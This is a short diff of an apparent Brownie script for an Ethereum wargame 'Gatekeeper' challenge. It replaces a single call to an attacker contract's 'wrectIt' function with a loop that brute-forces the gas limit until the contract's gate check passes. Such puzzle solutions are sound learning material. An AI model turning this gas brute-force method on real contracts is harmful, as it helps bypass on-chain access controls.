@@ -8,4 +8,11 @@ def deploy(gatekeeper_addr):
 def main(trespasser_addr):
   me = accounts.load("default")
   trespasser = Trespasser1.at(trespasser_addr)
-  trespasser.wrectIt("0x26bbE18a00007245", 802929, {'from':me, 'gas_limit':'1000000000000000000'})
+  for i in range(1, 8200):
+    gas = 81910 - (8191 - i)
+    try:
+      trespasser.wrectIt("0x26bbE18a00007245", {'from':me, 'gas_limit': gas})
+      print("Done")
+      break
+    except Exception as e:
+      print("Failed at {}".format(gas))
